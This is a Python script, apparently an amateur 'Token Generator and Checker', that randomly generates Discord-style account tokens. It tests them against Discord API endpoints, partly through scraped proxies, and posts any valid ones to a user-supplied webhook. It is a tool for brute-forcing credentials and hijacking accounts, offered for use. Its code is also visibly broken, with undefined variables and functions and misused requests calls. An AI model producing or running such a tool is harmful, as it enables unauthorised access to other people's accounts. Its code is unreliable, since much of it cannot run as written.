import time
import os
from colorama import Fore
import random
import string
import ctypes
from discord_webhook import DiscordWebhook 
import requests


class TokenGen: 
    def __init__(self): 
        self.fileName = "temp/TokenCodes.txt" 

    def main(self): 
        os.system('cls' if os.name == 'nt' else 'clear') 
        if os.name == "nt":
            print("")
            os.system(f'title Token Generator and Checker - Made by Astraa')
        else: 
            print(f'\33]0;Token Generator and Checker - Made by Astraa\a', end='', flush=True) 

        os.system('cls')
        tokengentitle()
        print(f"""{y}[{w}#{y}]{w} Input How Many Codes to Generate and Check: """)
        num = int(input(f"""{y}[{b}#{y}]{w} Number of generation: """))

        print(f"""\n{y}[{w}+{y}]{w} Do you wish to use a discord webhook? - [If so type it here or press enter to ignore]""")
        url = input(f"""{y}[{b}#{y}]{w} WebHook: """)
        time.sleep(1)
        os.system('cls')
        webhook = url if url != "" else None 
        valid = [] 
        invalid = 0 

        for i in range(num): 
            try: 
                code = "ODA"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
                url = f"{code}"

                result = self.quickChecker(url, webhook)

                if result:
                    valid.append(url)
                else:
                    invalid += 1
            except Exception as e:
                print(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} Error : {url} ")

            if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTitleW(f"Token Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Astraa")
                print("")
            else: 
                print(f'\33]0;Token Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Astraa\a', end='', flush=True)

        print(f"""\n
{y}[{b}+{y}]{w} Results:\n
          {y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Valid: {len(valid)}
          {y}[{Fore.LIGHTRED_EX }!{y}]{w} Invalid: {invalid}
          {y}[{w}!{y}]{w} Valid Codes: {', '.join(valid )}""")

        input(f"""\n\n{y}[{b}#{y}]{w} Press ENTER to exit""")
        main()

    def generator(self, amount):
        with open(self.fileName, "w", encoding="utf-8") as file:
            print(f"{y}[{b}#{y}]{w} Wait, Generating for you")

            start = time.time()

            for i in range(amount):
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))

                file.write(f"{code}\n")

            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n") #

    def getProxies():
        r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&ssl=yes')
        proxies = []
        for proxy in r.text.split('\n'):
            proxy = proxy.replace('\r', '')
            if proxy:
                proxies.append(proxy)
        return proxies

    global ProxyList
    ProxyList = getProxies()
    
    def fileChecker(self, notify = None):
        valid = []
        invalid = 0
        with open(self.fileName, "r", encoding="utf-8") as file:
            for proxy in ProxyList:
                ProxyParameters ={'http://': proxy,'https://': proxy}
                for line in file.readlines():
                    token = line.strip("\n")
                    headers = {
                                'Authorization': f'{token}'
                            }
                    url = requests.get(f"https://discordapp.com/api/v6/auth/login", proxies=ProxyParameters, timeout=5,  headers=headers)
                    response = requests.get(url)
                    if response.status_code == 200:
                        print(f"{Fore.WHITE}[{Fore.GREEN}!{Fore.WHITE}] {Fore.GREEN}VALID TOKEN{Fore.WHITE} : {token} ")
                        valid.append(token)

                        if notify is not None:
                            DiscordWebhook(
                                url = notify,
                                content = f"@everyone | A valid Token has been found => {token}"
                            ).execute()
                        else:
                            break
                    else:
                        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {Fore.RED}INVALID TOKEN{Fore.WHITE} : {token} ")
                        invalid += 1

            return {"valid" : valid, "invalid" : invalid}

    def quickChecker(self, token, notify = None):

        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{token}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)

        if response.status_code == 200:
            print(f"{Fore.WHITE}[{Fore.GREEN}!{Fore.WHITE}] {Fore.GREEN}VALID TOKEN{Fore.WHITE} : {token} ", flush=True, end="" if os.name == 'nt' else "\n")
            with open("temp/TokenCodes.txt", "w") as file:
                file.write(token)

            if notify is not None:
                DiscordWebhook(
                    url = notify,
                    content = f"@everyone | A valid Token has been found => {token}"
                ).execute()

            return True

        else:
            print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {Fore.RED}INVALID TOKEN{Fore.WHITE} : {token}", flush=True, end="" if os.name == 'nt' else "\n")
            return False

if __name__ == '__main__':
    Gen = TokenGen()
    Gen.main()